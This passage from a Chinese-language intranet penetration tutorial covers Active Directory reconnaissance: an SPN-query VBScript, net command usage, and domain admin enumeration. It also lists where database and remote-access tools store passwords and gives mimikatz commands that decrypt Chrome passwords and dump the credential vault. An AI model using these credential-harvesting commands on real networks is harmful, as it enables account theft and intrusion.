class="string">&quot;ADODB.Command&quot;</span>)</span><br><span class="line">oConnection.Provider = <span class="string">&quot;ADsDSOObject&quot;</span></span><br><span class="line">oConnection.Open <span class="string">&quot;ADs Provider&quot;</span></span><br><span class="line"><span class="keyword">Set</span> oCmd.ActiveConnection = oConnection</span><br><span class="line">oCmd.Properties(<span class="string">&quot;Page Size&quot;</span>) = <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Build the query string ---</span></span><br><span class="line">strADOQuery = <span class="string">&quot;&lt;&quot;</span> + strGCPath + <span class="string">&quot;&gt;;(&amp;(!objectClass=computer)(servicePrincipalName=*));&quot;</span> &amp; _</span><br><span class="line"><span class="string">&quot;dnsHostName,distinguishedName,servicePrincipalName,objectClass,&quot;</span> &amp; _</span><br><span class="line"><span class="string">&quot;samAccountName;subtree&quot;</span></span><br><span class="line">oCmd.CommandText = strADOQuery</span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Execute the query for the object in the directory ---</span></span><br><span class="line"><span class="keyword">Set</span> oRecordSet = oCmd.<span class="keyword">Execute</span></span><br><span class="line"><span class="keyword">If</span> oRecordSet.EOF <span class="keyword">and</span> oRecordSet.Bof <span class="keyword">Then</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;No SPNs found!&quot;</span></span><br><span class="line">Wscript.Quit <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">While</span> <span class="keyword">Not</span> oRecordset.Eof</span><br><span class="line">Wscript.Echo oRecordset.Fields(<span class="string">&quot;distinguishedName&quot;</span>)</span><br><span class="line"><span class="comment">&#x27;vObjClass = oRecordset.Fields(&quot;objectClass&quot;)</span></span><br><span class="line"><span class="comment">&#x27;strClass = vObjClass( UBound(vObjClass) )</span></span><br><span class="line"><span class="comment">&#x27;Wscript.Echo &quot;Class: &quot; &amp; strClass</span></span><br><span class="line"><span class="keyword">If</span> <span class="built_in">UCase</span>(strClass) = <span class="string">&quot;COMPUTER&quot;</span> <span class="keyword">Then</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;Computer DNS: &quot;</span> &amp; oRecordset.Fields(<span class="string">&quot;dnsHostName&quot;</span>)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Wscript.Echo <span class="string">&quot;User Logon: &quot;</span> &amp; oRecordset.Fields(<span class="string">&quot;samAccountName&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27;--- Display the SPNs on the object --- </span></span><br><span class="line">vSPNs = oRecordset.Fields(<span class="string">&quot;servicePrincipalName&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> vName <span class="keyword">in</span> vSPNs</span><br><span class="line">Wscript.Echo <span class="string">&quot;-- &quot;</span> + vName</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line">Wscript.Echo</span><br><span class="line">oRecordset.MoveNext</span><br><span class="line"><span class="keyword">Wend</span></span><br><span class="line"></span><br><span class="line">oRecordset.Close</span><br><span class="line">oConnection.Close</span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> ShowUsage()</span><br><span class="line">Wscript.Echo <span class="string">&quot; USAGE:        &quot;</span> &amp; WScript.ScriptName &amp; <span class="string">&quot; SpnToFind [GC Servername or Forestname]&quot;</span></span><br><span class="line">Wscript.Echo</span><br><span class="line">Wscript.Echo <span class="string">&quot;                     &quot;</span> &amp; WScript.ScriptName</span><br><span class="line">Wscript.Echo <span class="string">&quot;                     &quot;</span> &amp; WScript.ScriptName &amp; <span class="string">&quot; Corp.com&quot;</span></span><br><span class="line">Wscript.Quit <span class="number">0</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> ParseCommandLine()</span><br><span class="line"><span class="keyword">If</span> WScript.Arguments.Count = <span class="number">1</span> <span class="keyword">Then</span></span><br><span class="line"><span class="keyword">If</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;-h&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;--help&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;-?&quot;</span> <span class="keyword">Or</span> WScript.Arguments(<span class="number">0</span>) = <span class="string">&quot;/?&quot;</span> <span class="keyword">Then</span></span><br><span class="line">ShowUsage()</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">strGCPath = <span class="string">&quot;GC://&quot;</span> &amp; WScript.Arguments(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">ElseIf</span> WScript.Arguments.Count = <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line"><span class="comment">&#x27; Set the GC</span></span><br><span class="line"><span class="keyword">Set</span> oNSP = <span class="built_in">GetObject</span>(<span class="string">&quot;GC:&quot;</span>)</span><br><span class="line"><span class="keyword">For</span> <span class="keyword">Each</span> oGC <span class="keyword">in</span> oNSP</span><br><span class="line">strGCPath = oGC.ADsPath</span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">ShowUsage()</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/33.png?raw=true" alt="image-20200730214227054"></p></li></ol><h3 id="端口连接"><a href="#端口连接" class="headerlink" title="端口连接"></a>端口连接</h3><p>利用<code>netstat -ano</code>命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息。如果通信信息是入流量，则可以获取到跳板机/堡垒机、管理员的PC来源IP、本地web应用端口等信息；如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/34.png?raw=true" alt="image-20200730215441721"></p><h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>一个正常的Web应用肯定有对应的数据库账号密码信息，可以使用如下命令寻找包含密码字段的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">findstr  /s /m <span class="string">&quot;password&quot;</span> *.*</span><br></pre></td></tr></table></figure><p>这条命令是查找当前文件夹下的文件，不是全局搜索</p><p>接下来是各个中间件的默认配置文件路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#Tomcat</span><br><span class="line">&#x2F;CATALINA_HOME&#x2F;conf&#x2F;tomcat-users.xml</span><br><span class="line">#Apache</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">#Nginx</span><br><span class="line">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">#Wdcp</span><br><span class="line">&#x2F;www&#x2F;wdlinux&#x2F;wdcp&#x2F;conf&#x2F;mrpw.conf</span><br><span class="line">#Mysql</span><br><span class="line">&#x2F;mysql&#x2F;data&#x2F;mysql&#x2F;user.MYD</span><br></pre></td></tr></table></figure><h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><h4 id="net参数详解"><a href="#net参数详解" class="headerlink" title="net参数详解"></a>net参数详解</h4><p>直接使用<code>net /?</code>命令即可查看，下面是我用谷歌翻译的，凑合看</p><blockquote><p>ACCOUNTS</p></blockquote><p>如果输入不带参数的<code>net accounts</code>显示当前密码设置、登录时限及域信息</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>/forcelogoff:&#123;minutes|no&#125;</code></td><td>设置当用户帐号或有效登录时间过期时</td></tr><tr><td><code>/minpwlen:length</code></td><td>设置用户帐号密码的最少字符数</td></tr><tr><td><code>/maxpwage:&#123;days|unlimited&#125;</code></td><td>设置用户帐号密码有效的最大天数</td></tr><tr><td><code>/minpwage:days</code></td><td>设置用户必须保持原密码的最小天数</td></tr><tr><td><code>/uniquepw:number</code></td><td>要求用户更改密码时，必须在经过number次后才能重复使用与之相同的密码</td></tr><tr><td><code>/domain</code></td><td>在当前域的主域控制器上执行该操作</td></tr><tr><td><code>/sync</code></td><td>当用于主域控制器时，该命令使域中所有备份域控制器同步</td></tr></tbody></table><blockquote><p>COMPUTER </p></blockquote><p>作用：从域数据库中添加或删除计算机。</p><p>命令格式：<code>net computer \\computername &#123;/add | /del&#125;</code></p><p>举例：<code>net computer \\ascotbe /add</code>将计算机<strong>ascotbe</strong>添加到登录域。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>指定要添加到域或从域中删除的计算机</td></tr><tr><td><code>/add</code></td><td>将指定计算机添加到域</td></tr><tr><td><code>/del</code></td><td>将指定计算机从域中删除</td></tr></tbody></table><blockquote><p>CONFIG</p></blockquote><p>作用：显示当前运行的可配置服务，或显示并更改某项服务的设置。</p><p>命令格式：<code>net config [SERVER | WORKSTATION]</code></p><p>输入不带参数的命令<code>net config</code>显示可配置服务的列表</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>service</code></td><td>服务器</td></tr><tr><td><code>WORKSTATION</code></td><td>工作站</td></tr></tbody></table><blockquote><p>CONTINUE</p></blockquote><p>作用：重新激活挂起的服务。</p><p>命令格式：<code>net continue service</code></p><blockquote><p> FILE</p></blockquote><p>作用：显示某服务器上所有打开的共享文件名及锁定文件数。</p><p>命令格式：<code>net file [id [/close]]</code></p><p>输入不带参数的命令<code>net file</code>获得服务器上打开文件的列表</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>id</code></td><td>文件标识号</td></tr><tr><td><code>/close</code></td><td>关闭打开的文件并释放锁定记录</td></tr></tbody></table><blockquote><p>GROUP</p></blockquote><p>作用：在 Windows NT/2000/2003 Server 域中添加、显示或更改全局组。</p><p>命令格式：<code>net group groupname &#123;/add [/comment:&quot;text &quot;] | /delete&#125; [/domain]</code></p><p>输入不带参数的命令<code>net group</code>显示服务器名称及服务器的组名称</p><p>举例：<code>net group test GHS1 GHS2 /add</code>将现有用户帐号GHS1和GHS2添加到本地计算机的test组。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>groupname</code></td><td>要添加、扩展或删除的组</td></tr><tr><td><code>/comment:&quot;text&quot;</code></td><td>为新建组或现有组添加注释</td></tr><tr><td><code>/domain</code></td><td>在当前域的主域控制器中执行该操作，否则在本地计算机上执行操作</td></tr><tr><td><code>username[...]</code></td><td>列表显示要添加到组或从组中删除的一个或多个用户</td></tr><tr><td><code>/add</code></td><td>添加组或在组中添加用户名</td></tr><tr><td><code>/delete</code></td><td>删除组或从组中删除用户名</td></tr></tbody></table><blockquote><p>LOCALGROUP</p></blockquote><p>作用：添加、显示或更改本地组。</p><p>命令格式：<code>net localgroup groupname &#123;/add [/comment:&quot;text &quot;] | /delete&#125; [/domain]</code></p><p>输入不带参数的命令<code>net localgroup</code>显示服务器名称和计算机的本地组名称</p><p>举例：</p><ul><li><code>net localgroup ggg /add</code> 将名为ggg的本地组添加到本地用户帐号数据库；　　</li><li><code>net localgroup ggg </code>显示ggg本地组中的用户。</li></ul><p>参数和解释都和上面一样这边就不写了</p><blockquote><p>PAUSE</p></blockquote><p>作用：暂停正在运行的服务。</p><p>命令格式：<code>net pause service</code></p><blockquote><p>SESSION</p></blockquote><p>作用：列出或断开本地计算机和与之连接的客户端的会话。</p><p>命令格式：<code>net session [\\computername] [/delete] [/list]</code></p><p>输入不带参数的命令<code>net session</code>显示所有与本地计算机的会话的信息。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>标识要列出或断开会话的计算机。</td></tr><tr><td><code>/delete</code></td><td>结束与 <code>\\computername </code>计算机会话并关闭本次会话期间计算机的所有打开文件。如果省略<code>\\computername</code>参数，将取消与本地计算机的所有会话。</td></tr><tr><td><code>/list</code></td><td>列出清单</td></tr></tbody></table><blockquote><p>SHARE</p></blockquote><p>作用：创建、删除或显示共享资源。</p><p>命令格式：<code>net share sharename=drive:path [/users:number | /unlimited] [/remark:&quot;text&quot;]</code></p><p>输入不带参数的命令<code>net share</code>显示本地计算机上所有共享资源的信息</p><p>举例： </p><ul><li><code>net share ascotbe=c:\temp /remark:&quot;my first share&quot;</code>以ascotbe为共享名共享<strong>C:\temp</strong></li><li><code>net share ascotbe /delete</code>停止共享ascotbe目录</li></ul><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>sharename</code></td><td>是共享资源的网络名称</td></tr><tr><td><code>drive:path</code></td><td>指定共享目录的绝对路径</td></tr><tr><td><code>/users:number</code></td><td>设置可同时访问共享资源的最大用户数</td></tr><tr><td><code>/unlimited</code></td><td>不限制同时访问共享资源的用户数</td></tr><tr><td><code>/remark:&quot;text&quot;</code></td><td>添加关于资源的注释，注释文字用引号引住</td></tr></tbody></table><blockquote><p> START</p></blockquote><p>作用：启动服务，或显示已启动服务的列表。</p><p>命令格式：<code>net start service</code></p><blockquote><p>STATISTICS</p></blockquote><p>作用：显示本地工作站或服务器服务的统计记录。</p><p>命令格式：<code>net statistics workstation </code></p><blockquote><p> STOP</p></blockquote><p>作用：停止 Windows NT/2000/2003 网络服务。</p><p>命令格式：<code>net stop service</code></p><p>现在的系统都没有这个了，下面列出能停止的服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(1)alerter(警报)</span><br><span class="line">(2)client service for Netware(Netware 客户端服务)</span><br><span class="line">(3)clipbook server(剪贴簿服务器)</span><br><span class="line">(4)computer browser(计算机浏览器)</span><br><span class="line">(5)directory replicator(目录复制器)</span><br><span class="line">(6)ftp publishing service (ftp )(ftp 发行服务)</span><br><span class="line">(7)lpdsvc</span><br><span class="line">(8)Net logon(网络登录)</span><br><span class="line">(9)Network dde(网络 dde)</span><br><span class="line">(10)Network dde dsdm(网络 dde dsdm)</span><br><span class="line">(11)Network monitor agent(网络监控代理)</span><br><span class="line">(12)ole(对象链接与嵌入)</span><br><span class="line">(13)remote access connection manager(远程访问连接管理器)</span><br><span class="line">(14)remote access isnsap service(远程访问 isnsap 服务)</span><br><span class="line">(15)remote access server(远程访问服务器)</span><br><span class="line">(16)remote procedure call (rpc) locator(远程过程调用定位器)</span><br><span class="line">(17)remote procedure call (rpc) service(远程过程调用服务)</span><br><span class="line">(18)schedule(调度)</span><br><span class="line">(19)server(服务器)</span><br><span class="line">(20)simple tcp&#x2F;ip services(简单 TCP&#x2F;IP 服务)</span><br><span class="line">(21)snmp</span><br><span class="line">(22)spooler(后台打印程序)</span><br><span class="line">(23)tcp&#x2F;ip Netbios helper(TCP&#x2F;IP NETBIOS 辅助工具)</span><br><span class="line">(24)ups</span><br><span class="line">(25)workstation(工作站)</span><br><span class="line">(26)messenger(信使)</span><br><span class="line">(27)dhcp client</span><br></pre></td></tr></table></figure><blockquote><p>TIME</p></blockquote><p>作用：使计算机的时钟与另一台计算机或域的时间同步。</p><p>命令格式：<code>NET TIME [\\computername | /DOMAIN[:domainname] | /RTSDOMAIN[:domainname]] [/SET]</code></p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>要检查或同步的服务器名</td></tr><tr><td><code>/domain[:domainname]</code></td><td>指定要与其时间同步的域</td></tr><tr><td><code>/set</code></td><td>使本计算机时钟与指定计算机或域的时钟同步。</td></tr><tr><td><code>/rtsdomain[:domainname]</code></td><td>RT域</td></tr></tbody></table><blockquote><p>VIEW</p></blockquote><p>作用：显示域列表、计算机列表或指定计算机的共享资源列表。</p><p>命令格式：<code>NET VIEW [\\computername [/CACHE] | [/ALL] | /DOMAIN[:domainname]]</code></p><p>举例：</p><ul><li><code>net view \\GHS</code>查看GHS计算机的共享资源列表。</li><li><code>net view /domain:ascotbe</code>查看ascotbe域中的机器列表。</li></ul><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>\\computername</code></td><td>指定要查看其共享资源的计算机</td></tr><tr><td><code>/CACHE</code></td><td>缓存中的</td></tr><tr><td><code>/ALL</code></td><td>所有的</td></tr><tr><td><code>/DOMAIN[:domainname</code></td><td>域中的</td></tr></tbody></table><blockquote><p>USER</p></blockquote><p>作用：添加或更改用户帐号或显示用户帐号信息。</p><p>命令格式：</p><ul><li><code>NET USER username [password | *] [options]] [/DOMAIN]</code></li><li><code>NET USER username &#123;password | *&#125; /ADD [options] [/DOMAIN]</code></li><li><code>NET USER username [/DELETE] [/DOMAIN]</code></li><li><code>NET USER username [/TIMES:&#123;times | ALL&#125;]</code></li><li><code>NET USER username [/ACTIVE: &#123;YES | NO&#125;]</code></li></ul><p>举例：<code>Net user ascotbe</code>查看用户ascotbe的信息。</p><p>输入不带参数的命令<code>Net user</code>查看计算机上的用户帐号列表</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>username</code></td><td>添加、删除、更改或查看用户帐号名</td></tr><tr><td><code>password</code></td><td>为用户帐号分配或更改密码</td></tr><tr><td><code>/domain</code></td><td>在计算机主域的主域控制器中执行操作</td></tr><tr><td><code>/DELETE</code></td><td>删除</td></tr><tr><td><code>/ADD</code></td><td>在域中增加账号</td></tr><tr><td><code>/ACTIVE</code></td><td>（这个没用过）</td></tr><tr><td><code>/TIMES</code></td><td>（没用过）</td></tr></tbody></table><blockquote><p>USE</p></blockquote><p>作用：连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。</p><p>命令格式：</p><ul><li><code>NET USE [devicename | *] [\\computername\sharename[\volume] [password | *]]</code></li><li><code>NET USE [/USER:[domainname\]username]</code></li><li><code>NET USE [/USER:[dotted domain name\]username]</code></li><li><code>NET USE [/USER:[username@dotted domain name]</code></li><li><code>NET USE [/SMARTCARD]</code></li><li><code>NET USE [/SAVECRED]</code></li><li><code>NET USE [/REQUIREINTEGRITY]</code></li><li><code>NET USE [/REQUIREPRIVACY]</code></li><li><code>NET USE [/WRITETHROUGH]</code></li><li><code>NET USE [[/DELETE] | [/PERSISTENT:&#123;YES | NO&#125;]]</code></li></ul><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>devicename</code></td><td>指定要连接到的资源名称或要断开的设备名称</td></tr><tr><td><code>\\computername\sharename</code></td><td>服务器及共享资源的名称</td></tr><tr><td><code>password</code></td><td>访问共享资源的密码</td></tr><tr><td><code>*</code></td><td>提示键入密码</td></tr><tr><td><code>/user</code></td><td>连接的另外一个用户</td></tr><tr><td><code>domainname</code></td><td>指定另一个域</td></tr><tr><td><code>username</code></td><td>指定登录的用户名</td></tr><tr><td><code>/home</code></td><td>将用户连接到其宿主目录</td></tr><tr><td><code>/delete</code></td><td>取消指定网络连接</td></tr><tr><td><code>/persistent</code></td><td>控制永久网络连接的使用。</td></tr><tr><td><code>/SAVECRED</code></td><td>已保存</td></tr><tr><td><code>/REQUIREINTEGRITY</code></td><td>（不知道）</td></tr><tr><td><code>/REQUIREPRIVACY</code></td><td>（不知道）</td></tr><tr><td><code>/WRITETHROUGH</code></td><td>（不知道）</td></tr><tr><td><code>/SMARTCARD</code></td><td>智能卡</td></tr><tr><td><code>/volume</code></td><td>卷</td></tr></tbody></table><h4 id="查看域用户"><a href="#查看域用户" class="headerlink" title="查看域用户"></a>查看域用户</h4><p>普通域用户权限即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/35.png?raw=true" alt="image-20200730231555944"></p><h4 id="查看域管理员"><a href="#查看域管理员" class="headerlink" title="查看域管理员"></a>查看域管理员</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/36.png?raw=true" alt="image-20200730231613687"></p><h4 id="快速定位域控ip"><a href="#快速定位域控ip" class="headerlink" title="快速定位域控ip"></a>快速定位域控ip</h4><p>查到dimain后ping下这个主机名字，就能找到IP地址了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line">ping WIN-1OUEMJB0766</span><br><span class="line">nslookup -<span class="built_in">type</span>=all _ldap._tcp.dc._msdcs.domain.com</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/37.png?raw=true" alt="image-20200730231819436"></p><h4 id="查看域控制器"><a href="#查看域控制器" class="headerlink" title="查看域控制器"></a>查看域控制器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/38.png?raw=true" alt="image-20200730231833721"></p><h3 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h3><h4 id="查看共享资料"><a href="#查看共享资料" class="headerlink" title="查看共享资料"></a>查看共享资料</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure><h4 id="查看arp表"><a href="#查看arp表" class="headerlink" title="查看arp表"></a>查看arp表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/39.png?raw=true" alt="image-20200730231954183"></p><h4 id="查看hosts文件"><a href="#查看hosts文件" class="headerlink" title="查看hosts文件"></a>查看hosts文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linux</span></span><br><span class="line">cat  /etc/hosts</span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="built_in">type</span>  c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/40.png?raw=true" alt="image-20200730232021228"></p><h4 id="查看dns缓存"><a href="#查看dns缓存" class="headerlink" title="查看dns缓存"></a>查看dns缓存</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig  /displaydns</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/41.png?raw=true" alt="image-20200730232057694"></p><h3 id="会话收集"><a href="#会话收集" class="headerlink" title="会话收集"></a>会话收集</h3><p>在网内收集会话，如看管理员登录过哪些机器、机器被谁登录过，这样攻击的目标就会清晰很多。</p><p>api相关介绍如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;lmshare&#x2F;nf-lmshare-netsessionenum</span><br></pre></td></tr></table></figure><h3 id="收集凭证"><a href="#收集凭证" class="headerlink" title="收集凭证"></a>收集凭证</h3><p>拿下一台机器后，需要尽可能的收集信息。如下是几个常用软件保存密码的注册表地址，可以根据算法去解密保存的账号密码。</p><table><thead><tr><th>数据库名称</th><th>注册表</th></tr></thead><tbody><tr><td>MySQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your  connection name&gt;</td></tr><tr><td>MariaDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your  connection name&gt;</td></tr><tr><td>MongoDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your  connection name&gt;</td></tr><tr><td>Microsoft  SQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your  connection name&gt;</td></tr><tr><td>Oracle</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your  connection name&gt;</td></tr><tr><td>PostgreSQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your  connection name&gt;</td></tr><tr><td>SQLite</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your  connection name&gt;</td></tr></tbody></table><table><thead><tr><th>SecureCRT</th><th>注册表</th></tr></thead><tbody><tr><td>xp/win2003</td><td>C:\Documents  and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td></tr><tr><td>win7/win2008以上</td><td>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td></tr></tbody></table><table><thead><tr><th>Xshell</th><th>注册表</th></tr></thead><tbody><tr><td>Xshell 5</td><td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td>Xshell 6</td><td>%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</td></tr></tbody></table><table><thead><tr><th>WinSCP</th><th>注册表</th></tr></thead><tbody><tr><td>WinSCP</td><td>HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</td></tr></tbody></table><table><thead><tr><th>VNC</th><th>注册表</th><th></th></tr></thead><tbody><tr><td>RealVNC</td><td>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</td><td>Password</td></tr><tr><td>TightVNC</td><td>HKEY_CURRENT_USER\Software\TightVNC\Server  Value</td><td>Password  or PasswordViewOnly</td></tr><tr><td>TigerVNC</td><td>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td><td>Password</td></tr><tr><td>UltraVNC</td><td>C:\Program  Files\UltraVNC\ultravnc.ini</td><td>passwd or  passwd2</td></tr></tbody></table><h3 id="DPAP"><a href="#DPAP" class="headerlink" title="DPAP"></a>DPAP</h3><p>DPAPI，由微软从Windows 2000开始发布，称为Data ProtectionApplication Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 。</p><h4 id="解密Chrome密码"><a href="#解密Chrome密码" class="headerlink" title="解密Chrome密码"></a>解密Chrome密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot;</span> /unprotect</span><br></pre></td></tr></table></figure><h4 id="解密Credential"><a href="#解密Credential" class="headerlink" title="解密Credential"></a>解密Credential</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  vault::cred /patch</span><br></pre></td></tr></table></figure><h3 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h3><p>信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p><h4 id="查看域信任"><a href="#查看域信任" class="headerlink" title="查看域信任"></a>查看域信任</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest  /domain_trusts</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/42.png?raw=true" alt="image-20200730232120794"></p><h3 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h3><p>当存在域传送漏洞时，可以获取域名解析记录。当有了解析记录后，也能提高对网络环境的进一步认知，比如www解析的ip段可能在dmz区，mail解析的ip段可能在核心区域等等。</p><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup  -<span class="built_in">type</span>=ns domain.com</span><br><span class="line">nslookup</span><br><span class="line">sserver  dns.domain.com</span><br><span class="line">ls  domain.com</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/43.png?raw=true" alt="image-20200730232427143"></p><h4 id="linux"><a href="#linux" class="headerlink" 